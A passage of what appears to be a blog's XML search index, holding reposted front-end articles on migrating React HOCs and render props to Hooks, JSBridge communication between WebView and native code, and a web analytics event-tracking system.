你的产品帮助用户解决了什么问题？这些问题是否重要？ 你的产品的用户体验如何？ 用户的迁移成本是否足够低？ more，学习中…… 运营策略也同样重要： 产品初期比较粗糙的时候推广太快，容易给用户带来反感。 产品推广太慢，又容易被竞品抢占市场。 more，学习中…… 通过参与一次又一次的会议，提出问题，学习优秀产品的设计和运营思路。对于技术同学而言，无论是做自己的东西还是创业，都能起到很大的帮助。]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[How to migrate from HOCs to Hooks]]></title>
    <url>%2F2020%2F02%2F25%2FWeb%E5%89%8D%E7%AB%AF%2FHow%20to%20migrate%20from%20HOCs%20to%20Hooks%2F</url>
    <content type="text"><![CDATA[转载自网络，原文链接：https://dev.to/bnevilleoneill/how-to-migrate-from-hocs-to-hooks-4g3a The future is here, and you’re loving every single second of writing your React code with Hooks. You’re all like “useThis” and “useThat” and are having the time of your life implementing cross-cutting concerns with this new React feature. Then, out of nowhere, your manager tells you to fix a bug in some existing code. You know, that legacy crap you wrote in December of 2018? You realize you have to touch class components with lifecycles and this. That hook you wrote yesterday would fix the bug in a second, but since class components don’t support hooks, you’re stuck doing it “the old way”. What should you do? This article is going to show you two techniques to deal with these situations — creating HOCs from your hooks, and creating hooks from your HOCs. Wait, what’s a HOC? A HOC — or a higher order component — is a function that accepts a component, and returns a component that renders the passed component with a few extra props or capabilities. The React docs does a great job explaining them in more detail. Creating HOCs from your HooksWhy would you ever want to make your fancy, sleek Hooks into clunky, ol’ HOCs? Sounds like we’re going backwards, right? Well, not really. We’re providing a migration path that lets us use our hook logic in class components. This way, we can start using new code in old components without rewriting potentially complex logic. Implementing a HOC that provide your Hook API is pretty straight forward. 1234const withMyHook = Comp =&gt; () =&gt; &#123; const hookData = useMyHook(); return &lt;Comp ...&#123;hookData&#125; &#123;...props&#125; /&gt;;&#125; In the code shown above, we create a function that receives a component as an argument and returns a new function component. This function component calls our hook and passes any return values to the passed component. If your hook implementation requires static data, you can pass it in as an argument: 1234const withMyHook = hookArgs =&gt; Comp =&gt; () =&gt; &#123; const hookData = useMyHook(hookArgs); return &lt;Comp &#123;...hookData&#125; &#123;...props&#125; /&gt;;&#125; Here, we pass our static data to our HOC, which returns another HOC. It’s known as currying, and it’s basically functions returning functions. You’d use it like this: 123const MyDecoratedComponent = withMyHook(&#123; some: ‘value’ &#125;)(MyComponent); If your hook needs data based on props, you might want to consider using the render prop pattern instead: 1234const MyHook = (props) =&gt; &#123; const hookData = useMyHook(props.relevantData); return props.children(hookData);&#125; Your implementation may vary — but you can put different implementations into the module you store your hook in, and export the HOC version or render prop version as named exports. You would use these HOCs the same way you’d use any HOC — wrap the component you want to enhance with it. 1234class MyComponent extends React.Component &#123; …&#125;;const MyEnhancedComponent = withMyHook(MyComponent); Creating Hooks from your HOCsIf you’re working with any non-trivial app, your code base is most likely going to contain a few HOCs and render props components. As you continue to refactor your app, you might want to migrate away from these and recreate your existing shared logic as hooks. The biggest challenge in rewriting your HOCs and render prop based components to hooks is the change in paradigms. Previously, you thought in terms of lifecycle methods — now you’ll have to think about renders and how props are changing. The always great Donavon created this nice chart that tries to map the two paradigms together: Flow chart courtesy of Donavon. Code available at https://github.com/donavon/hook-flow There aren’t any generic patterns to follow here, but instead, I’ll show an example. By the end, you’ll have a few ideas for your own rewrites. withScreenSize =&gt; useScreenSizewithScreenSize is a utility that provides the current screen size to our component. It’s implemented like this: 12345678910111213141516171819202122import React from ‘react’;import debounce from ‘debounce’;const withScreenSize = Comp =&gt; &#123; return class extends React.Component &#123; state = &#123; width: null, height: null &#125;; updateScreenSize = debounce(() =&gt; &#123; this.setState(&#123; width: window.screen.width, height: window.screen.height &#125;); &#125;, 17); componentDidMount() &#123; window.addEventListener(‘resize’, this.updateScreenSize); &#125; componentWillUnmount() &#123; window.removeEventListener(‘resize’, this.updateScreenSize); &#125; render() &#123; return &lt;Comp &#123;...this.props&#125; screenSize=&#123;this.state&#125; /&gt; &#125; &#125;;&#125; We can implement this with Hooks like so: 12345678910111213141516171819202122import React from ‘react’;import debounce from ‘debounce’;const useScreenSize = () =&gt; &#123; const [screenSize, setScreenSize] = React.useState(&#123; width: window.innerWidth, height: window.innerHeight, &#125;); const updateScreenSize = debounce(() =&gt; &#123; setScreenSize(&#123; width: window.innerWidth, height: window.innerHeight, &#125;); &#125;, 17); React.useEffect(() =&gt; &#123; window.addEventListener(‘resize’, updateScreenSize); return () =&gt; &#123; window.removeEventListener(‘resize’, updateScreenSize); &#125;; &#125;, []); return screenSize;&#125;; We store the width and height via the useState hook, and initialize it to be the window dimensions while mounting the component. Then, we re-implement the updateScreenSize method by using the setter from the useState call above. Finally, we apply the resize listener by using the useEffect hook. Notice that we’re passing an empty dependency array — that means it’ll only run once. Remember — if you want to keep supporting class components, you can write a wrapper HOC: 1234const withScreenSize = Comp =&gt; props =&gt; &#123; const screenSize = useScreenSize(); return &lt;Comp &#123;…props&#125; screenSize=&#123;screenSize&#125; /&gt;;&#125;; Jump on the bandwagon, already!Hooks are here to stay, and they’re about to simplify your code base in a big way. In order to migrate away from existing patterns, however, you’re going to have to compromise at times. This article shows how you can write wrappers around your existing HOCs and render props components, as well as how you can get started refactoring your existing HOCs to be Hooks.]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Using custom hooks in place of "render props"]]></title>
    <url>%2F2020%2F02%2F25%2FWeb%E5%89%8D%E7%AB%AF%2FUsing%20custom%20hooks%20in%20place%20of%20%22render%20props%22%2F</url>
    <content type="text"><![CDATA[转载自网络，原文链接：https://dev.to/emeka/using-custom-hooks-in-place-of-render-props-38mf One of the sweet but sometimes difficult to figure out part of React is reusing stateful logic across various components. Instead of rewriting a certain stateful logic whenever we need it, we would all love to write this logic just once and then reuse it in whatever components need it. A common pattern that makes this possible is “render props”.A component with a render prop takes a function that returns a React element and calls it instead of implementing its own render logic. This component can be termed the ‘Container Component’ while the React element or component we are returning can be termed a ‘presentation Component’. 12345678910111213141516// example 1&lt;Container render=&#123;prop =&gt; ( &lt;Presentation &#123;...props&#125; /&gt;)&#125; /&gt;// example 2&lt;Container children=&#123;prop =&gt; ( &lt;Presentation &#123;...props&#125; /&gt;)&#125; /&gt;// example 3&lt;Container&gt; &#123;props =&gt; ( &lt;Presentation &#123;...props&#125; /&gt; )&#125;&lt;/Container&gt; The three examples above implement the render props pattern, where ‘Container’ is our container Component that renders a presentation component…well, literally. We can put whatever stateful logic we need to reuse in the Container component, and the results along with an ‘updating function’ if needed can be passed down to any other component it renders. That’s “render props” in a nutshell. What is the alternative?What if instead of having the container, we have a custom hook that implements this logic and returns the result with an ‘updating function’. By ‘updating function’ I mean a function that updates the state in the container or the result from our hook. How we can implement this is the exact reason we are here. Let’s make use of a “cat and mouse” example I found in the official React documentation for render props. We will take a look at the “render props” example and try to refactor it to use a custom hook. Render Props ExampleIf we have a component that listens to the mouse movement and sets the pointer position in the state as shown below: 123456789101112131415161718192021222324252627class Mouse extends React.Component &#123; constructor(props) &#123; super(props); this.handleMouseMove = this.handleMouseMove.bind(this); this.state = &#123; x: 0, y: 0 &#125;; &#125; handleMouseMove(event) &#123; this.setState(&#123; x: event.clientX, y: event.clientY &#125;); &#125; render() &#123; return ( &lt;div style=&#123;&#123; height: &apos;100%&apos; &#125;&#125; onMouseMove=&#123;this.handleMouseMove&#125;&gt; &#123;/* Instead of providing a static representation of what &lt;Mouse&gt; renders, use the `render` prop to dynamically determine what to render. */&#125; &#123;this.props.render(this.state)&#125; &lt;/div&gt; ); &#125;&#125; Any component that needs to render elements based on the position of the mouse can be rendered by our mouse component. Let’s define a Cat component that renders the image of a cat chasing the mouse pointer. 123456789class Cat extends React.Component &#123; render() &#123; const mouse = this.props.mouse; return ( &lt;img src=&quot;/cat.jpg&quot; style=&#123;&#123; position: &apos;absolute&apos;, left: mouse.x, top: mouse.y &#125;&#125; /&gt; ); &#125;&#125; We don’t need to rewrite the logic for getting the pointer position but rather we can extend this logic from the Mouse component like this: 123456789101112class MouseTracker extends React.Component &#123; render() &#123; return ( &lt;div&gt; &lt;h1&gt;Move the mouse around!&lt;/h1&gt; &lt;Mouse render=&#123;mouse =&gt; ( &lt;Cat mouse=&#123;mouse&#125; /&gt; )&#125;/&gt; &lt;/div&gt; ); &#125;&#125; This will render the Cat component passing down the position of the mouse as a prop. We can reuse the logic in as many components as we need to. The hook alternativeWe are going to get rid of our ‘Mouse’ component and instead, create a hook to implement our mouse logic. 12345678910export function useMouse(initialValue = &#123;x:0, y:0&#125;) &#123; const [position, setPosition] = useState(initialValue); const handleMouseMove = (event) =&gt; &#123; setPosition(&#123; x: event.clientX, y: event.clientY &#125;); &#125; return [position, handleMouseMove];&#125; We have just defined a hook called useMouse. It’s a convention that the function name should start with ‘use’ so that people know it is a hook. Our useMouse hook returns the position of the mouse and a function to update that position. Let’s see how we can use this in our Cat component. 12345678910function Cat() &#123; const [position, setMousePosition] = useMouse(); return ( &lt;div style=&#123;&#123; height: &apos;100%&apos; &#125;&#125; onMouseMove=&#123;setMousePosition&#125;&gt; &lt;img src=&quot;/cat.jpg&quot; style=&#123;&#123; position: &apos;absolute&apos;, left: position.x, top: position.y &#125;&#125; /&gt; ); &lt;/div&gt;&#125; What word comes to mind, simple?..neat?..concise? Maybe all three. Any component that needs to get the mouse position as it moves can use this hook.Using this pattern improves the readability and maintainability of complex react code and it will also help to prevent having very large and deeply nested component trees. We can reuse auth status, user information and even form handling logic by creating custom hooks. They can also be used in place of HOCs(Higher Order Components) in React.]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSBridge 初探]]></title>
    <url>%2F2020%2F02%2F24%2FWeb%E5%89%8D%E7%AB%AF%2FJSBridge%20%E5%88%9D%E6%8E%A2%2F</url>
    <content type="text"><![CDATA[转载自掘金网络，原文链接：https://juejin.im/post/5e5248216fb9a07cb0314fc9 JSBridge 的起源近些年，移动端普及化越来越高，开发过程中选用 Native 还是 H5 一直是热门话题。Native 和 H5 都有着各自的优缺点，为了满足业务的需要，公司实际项目的开发过程中往往会融合两者进行 Hybrid 开发。Native 和 H5 分处两地，看起来无法联系，那么如何才能让双方协同实现功能呢？ 这时我们想到了 Codova ，Codova 提供了一组与设备相关的 API ，是早期 JS 调用原生代码来实现原生功能的常用方案。不过 JSBridge 真正在国内广泛应用是由于移动互联网的盛行。 JSBridge 是一种 JS 实现的 Bridge，连接着桥两端的 Native 和 H5。它在 APP 内方便地让 Native 调用 JS，JS 调用 Native ，是双向通信的通道。JSBridge 主要提供了 JS 调用 Native 代码的能力，实现原生功能如查看本地相册、打开摄像头、指纹支付等。 H5 与 Native 对比 name H5 Native 稳定性 调用系统浏览器内核，稳定性较差 使用原生内核，更加稳定 灵活性 版本迭代快，上线灵活 迭代慢，需要应用商店审核，上线速度受限制 受网速 影响 较大 较小 流畅度 有时加载慢，给用户“卡顿”的感觉 加载速度快，更加流畅 用户体验 功能受浏览器限制，体验有时较差 原生系统 api 丰富，能实现的功能较多，体验较好 可移植性 兼容跨平台跨系统，如 PC 与 移动端，iOS 与 Android 可移植性较低，对于 iOS 和 Android 需要维护两套代码 JSBridge 的双向通信原理 JS 调用 Native JS 调用 Native 的实现方式较多，主要有拦截 URL Scheme 、重写 prompt 、注入 API 等方法。 拦截 URL SchemeAndroid 和 iOS 都可以通过拦截 URL Scheme 并解析 Scheme 来决定是否进行对应的 Native 代码逻辑处理。 Android 的话，Webview 提供了 shouldOverrideUrlLoading 方法来提供给 Native 拦截 H5 发送的 URL Scheme 请求。代码如下： 12345678910111213141516public class CustomWebViewClient extends WebViewClient &#123; @Override public boolean shouldOverrideUrlLoading(WebView view, String url) &#123; ...... // 场景一： 拦截请求、接收 scheme if (url.equals(&quot;xxx&quot;)) &#123; // handle ... // callback view.loadUrl(&quot;javascript:setAllContent(&quot; + json + &quot;);&quot;) return true; &#125; return super.shouldOverrideUrlLoading(url); &#125;&#125; iOS 的 WKWebview 可以根据拦截到的 URL Scheme 和对应的参数执行相关的操作。代码如下： 123456- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler&#123; if ([navigationAction.request.URL.absoluteString hasPrefix:@&quot;xxx&quot;]) &#123; [[UIApplication sharedApplication] openURL:navigationAction.request.URL]; &#125; decisionHandler(WKNavigationActionPolicyAllow);&#125; 这种方法的优点是不存在漏洞问题、使用灵活，可以实现 H5 和 Native 页面的无缝切换。例如在某一页面需要快速上线的情况下，先开发出 H5 页面。某一链接填写的是 H5 链接，在对应的 Native 页面开发完成前先跳转至 H5 页面，待 Native 页面开发完后再进行拦截，跳转至 Native 页面，此时 H5 的链接无需进行修改。但是使用 iframe.src 来发送 URL Scheme 需要对 URL 的长度作控制，使用复杂，速度较慢。 重写 prompt 等原生 JS 方法Android 4.2 之前注入对象的接口是 addJavascriptInterface ，但是由于安全原因慢慢不被使用。一般会通过修改浏览器的部分 Window 对象的方法来完成操作。主要是拦截 alert、confirm、prompt、console.log 四个方法，分别被 Webview 的 onJsAlert、onJsConfirm、onConsoleMessage、onJsPrompt 监听。其中 onJsPrompt 监听的代码如下： 12345public boolean onJsPrompt(WebView view, String origin, String message, String defaultValue, final JsPromptResult result) &#123; String handledRet = parentEngine.bridge.promptOnJsPrompt(origin, message, defaultValue); xxx; return true;&#125; iOS 由于安全机制，WKWebView 对 alert、confirm、prompt 等方法做了拦截，如果通过此方式进行 Native 与 JS 交互，需要实现 WKWebView 的三个 WKUIDelegate 代理方法。代码示例如下： 12345678910111213-(void)webView:(WKWebView *)webView runJavaScriptAlertPanelWithMessage:(NSString *)message initiatedByFrame:(WKFrameInfo *)frame completionHandler:(void (^)(void))completionHandler&#123; UIAlertController *alertController = [UIAlertController alertControllerWithTitle:nil message:message?:@&quot;&quot; preferredStyle:UIAlertControllerStyleAlert]; [alertController addAction:([UIAlertAction actionWithTitle:@&quot;确认&quot; style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) &#123; completionHandler(); &#125;])]; [self presentViewController:alertController animated:YES completion:nil];&#125; 使用该方式时，可以与 Android 和 iOS 约定好使用传参的格式，这样 H5 可以无需识别客户端，传入不同参数直接调用 Native 即可。剩下的交给客户端自己去拦截相同的方法，识别相同的参数，进行自己的处理逻辑即可实现多端表现一致。如： 1alert(&quot;确定xxx?&quot;, &quot;取消&quot;, &quot;确定&quot;, callback()); 另外，如果能与 Native 确定好方法名、传参等调用的协议规范，这样其它格式的 prompt 等方法是不会被识别的，能起到隔离的作用。 注入 API基于 Webview 提供的能力，我们可以向 Window 上注入对象或方法。JS 通过这个对象或方法进行调用时，执行对应的逻辑操作，可以直接调用 Native 的方法。使用该方式时，JS 需要等到 Native 执行完对应的逻辑后才能进行回调里面的操作。 Android 的 Webview 提供了 addJavascriptInterface 方法，支持 Android 4.2 及以上系统。 123456789101112gpcWebView.addJavascriptInterface(new JavaScriptInterface(), &apos;nativeApiBridge&apos;); public class JavaScriptInterface &#123; Context mContext; JavaScriptInterface(Context c) &#123; mContext = c; &#125; public void share(String webMessage)&#123; // Native 逻辑 &#125;&#125; JS 调用示例： 1window.NativeApi.share(xxx); iOS 的 UIWebview 提供了 JavaScriptScore 方法，支持 iOS 7.0 及以上系统。WKWebview 提供了 window.webkit.messageHandlers 方法，支持 iOS 8.0 及以上系统。UIWebview 在几年前常用，目前已不常见。以下为创建 WKWebViewConfiguration 和 创建 WKWebView 示例： 12345678910111213141516171819WKWebViewConfiguration *configuration = [[WKWebViewConfiguration alloc] init];WKPreferences *preferences = [WKPreferences new];preferences.javaScriptCanOpenWindowsAutomatically = YES;preferences.minimumFontSize = 40.0;configuration.preferences = preferences; - (void)viewWillAppear:(BOOL)animated&#123; [super viewWillAppear:animated]; [self.webView.configuration.userContentController addScriptMessageHandler:self name:@&quot;share&quot;]; [self.webView.configuration.userContentController addScriptMessageHandler:self name:@&quot;pickImage&quot;];&#125;- (void)viewWillDisappear:(BOOL)animated&#123; [super viewWillDisappear:animated]; [self.webView.configuration.userContentController removeScriptMessageHandlerForName:@&quot;share&quot;]; [self.webView.configuration.userContentController removeScriptMessageHandlerForName:@&quot;pickImage&quot;];&#125; JS 调用示例： 1window.webkit.messageHandlers.share.postMessage(xxx); Native 调用 JS Native 调用 JS 比较简单，只要 H5 将 JS 方法暴露在 Window 上给 Native 调用即可。 Android 中主要有两种方式实现。在 4.4 以前，通过 loadUrl 方法，执行一段 JS 代码来实现。在 4.4 以后，可以使用 evaluateJavascript 方法实现。loadUrl 方法使用起来方便简洁，但是效率低无法获得返回结果且调用的时候会刷新 WebView。evaluateJavascript 方法效率高获取返回值方便，调用时候不刷新WebView，但是只支持 Android 4.4+。相关代码如下： 1234567webView.loadUrl(&quot;javascript:&quot; + javaScriptString);webView.evaluateJavascript(javaScriptString, new ValueCallback&lt;String&gt;() &#123; @Override public void onReceiveValue(String value)&#123; xxx &#125;&#125;); iOS 在 WKWebview 中可以通过 evaluateJavaScript:javaScriptString 来实现，支持 iOS 8.0 及以上系统。 123456789// swiftfunc evaluateJavaScript(_ javaScriptString: String, completionHandler: ((Any?, Error?) -&gt; Void)? = nil)// javaScriptString 需要调用的 JS 代码// completionHandler 执行后的回调复制代码// objective-c[jsContext evaluateJavaScript:@&quot;ZcyJsBridge(ev, data)&quot;] JSBridge 的使用 如何引用 由 H5 引用 在我司移动端初期版本时采用的是该方式，采用本地引入 npm 包的方式进行调用。这种方式可以确定 JSBridge 是存在的，可直接调用 Native 方法。但是如果后期 Bridge 的实现方式改变，双方需要做更多的兼容，维护成本高 由 Native 注入 这是当前我司移动端选用的方式。在考虑到后期业务需要的情况下，进行了重新设计，选用 Native 注入的方式来引用 JSBridge。这样有利于保持 API 与 Native 的一致性，但是缺点是在 Native 注入的方法和时机都受限，JS 调用 Native 之前需要先判断 JSBridge 是否注入成功 使用规范 H5 调用 Native 方法的伪代码实例，如： 12345678910111213141516171819params = &#123; api_version: &quot;xxx&quot;, // API 版本 title: &quot;xxx&quot;, // 标题 filename: &quot;xxx&quot;, // 文件名称 image: &quot;xxx&quot;, // 图片链接 url: &quot;xxx&quot;, // 网址链接 success: function (res) &#123; xxx; // 调用成功后执行 &#125;, fail: function (err) &#123; if (err.code == &apos;-2&apos;) &#123; fail &amp;&amp; fail(err); // 调用了当前客户端中不存在的 API 版本 &#125; else &#123; const msg = err.msg; //异常信息 Toast.fail(msg); &#125; &#125;&#125;;window.NativeApi.share(params); 以下简要列出通用方法的抽象，目前基本遵循以下规范进行双端通信。 123456789101112window.NativeApi.xxx(&#123; api_version:&apos;&apos;, name: &quot;xxx&quot;, path: &quot;xxx&quot;, id: &quot;xxx&quot;, success: function (res) &#123; console.log(res); &#125;, fail: function (err) &#123; console.log(err); &#125;&#125;); 由于初期版本选择了由 H5 本地引用 JSBridge，后期采用 Native 注入的方式。现有的 H5 需要对各种情况做兼容，逻辑抽象如下： 1234567891011121314151617181920212223reqNativeBridge(vm, fn) &#123; if (!isApp()) &#123; // 如果不在 APP 内进行调用 vm.$dialog.alert(&#123; message: &quot;此功能需要访问 APP 才能使用&quot;, &#125;); &#125; else &#123; if (!window.NativeApi) &#123; // 针对初期版本 vm.$dialog.alert(&#123; message: &quot;请更新到最新 APP 使用该功能&quot;, &#125;); &#125; else &#123; // 此处只针对“调用了当前客户端中不存在的 API 版本”的报错进行处理 // 其余种类的错误信息交由具体的业务去处理 fn &amp;&amp; fn((err) =&gt; &#123; vm.$dialog.alert(&#123; message: &quot;请更新到最新 APP 使用该功能&quot;, &#125;); &#125;); &#125; &#125;&#125; 总结上述内容简要介绍了 JSBridge 的部分原理，希望对从未了解过 JSBridge 的同学能有所帮助。如果需要更深入的了解 JSBridge 的原理和实现，如 JSBridge 接口调用的封装实现，JS 调用 Native 时的回调的唯一性等。大家可以去查阅更多资料，参考更详细的相关文档或他人的整理成文的沉淀。]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端工程实践之数据埋点分析系统（一）]]></title>
    <url>%2F2020%2F02%2F24%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%9F%8B%E7%82%B9%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[转载自掘金网络，原文链接：https://juejin.im/post/5e3fb599f265da573f3563b9 背景随着公司业务的不断增长，平台业务的不断增加，场景复杂度也对应的有所增加。这对平台产品的用户体验，商业场景的深化运营，及过程中对平台用户的使用便捷性，都带来了不小的影响和挑战。为更精准的触达用户痛点，定位转化低点，提升业务赋能，基于数据分析的优化策略势在必行。 政采云前端团队（ZooTeam），从去年年底开始，主动主导推进公司业务层面的 Web 数据埋点及分析量化的能力建设（内部产品化命名“浑仪系统”）。希望基于我们过去一段时间的事件和经验，能为正有意实践此方向从 0 到 1 建设的小伙伴们，提供一些思路和帮助。 系统概览数据埋点分析系统都做了些什么？采集了哪些数据？这些数据我们将如何运用和分析？最终又将如何展示呢？ 首先我们看下系统结构。整个系统由以下 4 个部分组成，期望能提供一套完整的用户行为分析的解决方案： 埋点采集 JSSDK：收集用户行为数据，并进行上报； 数据处理服务：接收上报数据并存储；筛取所需数据，进行数据处理并透出； 数据可视化平台：汇总展示详细数据，支持自定义，打通业务； Chrome插件工具：在页面上直观展示坑位数据，提供场景更友好的数据可视化服务； 其基本协作流程是，用户进入平台任意一个已埋点的 Web 页面，进行的一系列（进入、点击、滚屏等）操作，都会由 JSSDK 进行分类并将数据上报至服务端进行存储，再由站点 / 插件发起查询，服务端将处理后的数据返回，再通过数据可视化平台进行透出展示。 数据采集数据采集一般分为以下三种： 无埋点（全埋点）：零埋点成本，抓取用户行为全量数据，任何操作行为都会被上传。数据量大，“噪音”多； 可视化埋点：在页面中操作，选择埋点位置/模块，非开发人员也可以进行埋点； 侵入式埋点：埋点时需要将数据采集代码写入业务代码中，埋点成本较高，但准确度也更高； 由于对数据的准确度要求较高，同时希望前期只投入较少的开发资源就可以进行快速试错，并为了满足重点的用户行为数据的采集需求，因此，我们优先采用代码侵入式埋点方案。 同时针对其接入成本较高的劣势，我们也将埋点在搭建系统及组件中采用了自动化的植入方式，这点将不再此详述。为降低接入成本并且更加灵活的捕获数据，我们采用了 DOM 节点挂载特殊属性后自动发送和手动自定义发送两种方式结合，以满足不同场景的需要。 123456789101112//自动发送埋点方式，举例：&lt;button data-utm-click=&quot;$&#123;did&#125;&quot; data-utm-data=&quot;$&#123;业务数据&#125;&quot;&gt;//手动发送埋点方式，举例：const utmCnt = g_UTM.batchSend(&apos;触发类型（click/browse）等&apos;,[&#123; utmCD:[&apos;区块信息&apos;,&apos;位置信息&apos;], bdata:&#123;key:&apos;其他业务数据&apos;&#125; &#125;,&#123; utmCD:[&apos;001&apos;,&apos;008&apos;], bdata:&#123;key:&apos;value&apos;&#125; &#125;]);复制代码 基于用户行为分析这个大目标，我们所采集数据紧紧围绕着两个主题，即：Event（事件/行为）和 User（用户）。 围绕“事件“我们采集了：事件的类型、发生时间、页面位置等信息，组成事件唯一标识。 围绕”用户“我们采集了：用户 IP、操作系统、浏览器信息、屏幕分辨率等，并生成用户唯一标识植入 Cookie 中。 12345678910111213141516171819&#123; bdata: &#123;&#125;, //业务数据 createTime: &quot;1571038815128&quot;, // 创建时间 evt: &quot;browse&quot;, // 事件类型 ipAddr: 122.226.174.195, //ip地址 logType: 2, // 触发类型 lver: 1.1.0, //版本 mx: 0, // 页面位置坐标x my: 0, // 页面位置坐标y os: &quot;Windows/7&quot;, // 操作系统 pre: &quot;https://www.zcygov.cn/&quot;, // 来源地址 scr: &quot;1920x1360&quot;, // 屏幕分辨率 url: &quot;https://www.zcygov.cn/&quot;, // 页面地址 userId: &quot;001&quot;, // 用户标识 utmCnt: &quot;a0004.2ef5001f.0001.0001.d814bf60ee5511e99397b37fe9083257&quot;, // 触发位置 utmUrl: &quot;a0004.2ef5001f.0001.0001&quot;, // 来源位置 uuid: &quot;d7fd8de0-ee55-11e9-9397-b37fe9083257&quot;, // 浏览器唯一标识&#125;复制代码 上述一些收集的字段，会在下面案例中使用到。 数据展示目前前台站点已经提供了比较丰富的数据展示功能，比如：PV（浏览次数）/UV（浏览人数） 排序或趋势、漏斗分析、路径分析、热图分析、用户画像、自定义看板等等，还有各种业务相关的数据统计及报表导出功能。总体菜单如下： PV/UV 排序或趋势（PV：PageView，页面浏览次数，用户每打开一次记录一次，多次打开同一页面将累计多次；UV：UserView，浏览页面人数；下文中将直接用PV/UV；） 全站的PV/UV单日趋势图：分时段查看访问量的高峰和低谷； PV/UV排序：查看Top页面的PV/UV 按页面、时间区间查询PV/UV 漏斗分析：按流程排序每个阶段的人数，计算出转化率； 路径分析：查询各个页面的来源和去向； 热图分析 点击热图：按钮及链接点击的热图； 滚屏热图（即将上线）：用户页面滚屏触达率； 用户画像（即将上线）：针对重点用户的回访次数、浏览路径、用户身份、所在地、操作系统、浏览器等详细信息查询； 自定义看板：可选择首页看板的展示项； 赋能业务采集和分析哪些数据才是对业务有价值的，我们参考了许多业界成熟的用户行为分析解决方案，包括： GrowingIO 神策数据 数极客 这些产品在用户行为分析侧的功能可以说是做到了大而全。根据我们的实际需求可以筛选出以下一些重点功能模块： 关键功能点 数极客 神策数据 GrowingIO 自研系统 表单分析 支持 支持 支持 不支持 页面分析 支持 支持 支持 支持 路径分析 支持 支持 支持 支持 漏斗分析 支持 支持 支持 支持 事件分析 支持 支持 支持 支持 事件分布分析 支持 支持 支持 支持 用户分群 支持 支持 支持 支持 行为预测 不支持 支持 不支持 不支持 用户行为序列 不支持 支持 不支持 不支持 热图 支持 支持 支持 支持 视频回放 支持 不支持 不支持 不支持 上面大部分一支持的功能都可以在【数据展示】模块中查看，表单分析及用户行为序列目前已在我们版本的规划中。表单分析是分析一个用户从进入一个表单填写页面到表单提交的过程中各个行为的分析，每个表单项的填写率、重填率、填写时长、放弃率等都是重要的分析指标，会直接影响到整体的转化率。也能帮助开发人员及时发现和定位表单页面中的交互问题，从而提升用户体验，和重要链路中的转化率。 例如：常见的注册表单的转化，即 10 个用户进入注册页面但最后只有 7 个用户成功注册，这个功能可以有效发掘剩余 3 个注册失败的用户流失的点，找到他们是在填写哪个表单项前离开页面或是找到重填率最高的表单项进行优化。用户行为序列是从单一用户的角度去查看在我们站点上的行为轨迹，从而去分析重点用户的行为喜好。 基于公司当前的业务发展，除了上述基础功能模块外，系统中还会对应考虑一些定制化的业务能力模块。依据目前系统的能力类型，可分为用户行为分析、链路转化分析、用户体验分析等： 搜索流程埋点案例那么在一个页面或者一个流程中我们可以采集到哪些有价值的数据呢？下面我们就以一个简单的流程为例来说明。 这里流程可以分为三步，首先，用户进入政采云电子卖场首页，并在搜索框中输入想要搜索的关键词，其次，点击搜索按钮后进入搜索结果页，最后，在结果页中找到了目标商品并点击进去了商品详情页查看。这是在一个电商平台中用户操作行为中较为常见的一种流程，也是一个关键流程。 我们在上述的三个页面中会采集的数据有以下三种： 页面进入/离开自动埋点 按钮点击埋点 链接点击埋点 如上图所示，通过 Chrome 插件工具，可以在页面上直观的展示链接和按钮的点击次数（数据已脱敏）。 利用上面说到的三项埋点，我们在单个页面中可以得到用户行为相关的四种数据。 PV：通过计算日志中所有进入页面日志条数的总和我们可以得到 pv UV：以唯一 uuid 将 pv 进行过滤后可以得到 uv ； 按钮点击数：直接通过统计按钮点击事件上报的日志条数可以得到按钮的点击量； 链接点击数：与按钮点击有所不同，按钮点击是通过单独发送的点击事件上报来进行统计，而链接点击往往导致的是一次页面跳转，此处即为从电子卖场首页离开进入了搜索结果页，此时我们所统计的就是搜索结果页的页面进入事件中的 utmUrl（即来源按钮的唯一识别码）值，判断出该次搜索结果页的进入是来源于首页常见搜索关键词的点击，从而统计出该位置的的链接点击量。 再对这些数据进行加工，我们进一步可以得到：停留时长、转化率、热力图； 热力图：用于反映图中点的密集程度，在此处我们利用点击的坐标（点击的 x,y 坐标位置，再根据屏幕分辨率做一致性的换算）组合成点击热图，如下图所示（数据已脱敏）。 漏斗分析：由一个元事件/虚拟事件加一个或者多个筛选条件组成，表示一个转化流程中的一个关键性的步骤；在我们平台上创建一个漏斗主要由以下几步： 如下图所示，在这个漏斗中定义了三个事件。 将这三个事件串联起来，可以得到完整的漏斗分析图（数据已脱敏）。 总结本文只是对通用类型的数据埋点与分析系统做了下初步的能力项介绍，后续我们将针对每个踩过的坑和做过的优化产出一系列的文章，希望各位能给予意见。 《如何高效完整的采集数据》 《埋点数据分析模型设计》 《Chrome插件之数据可视化》 作者：政采云前端团队链接：https://juejin.im/post/5e3fb599f265da573f3563b9来源：掘金著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github+jsDelivr+PicGo 打造稳定快速、高效免费图床]]></title>
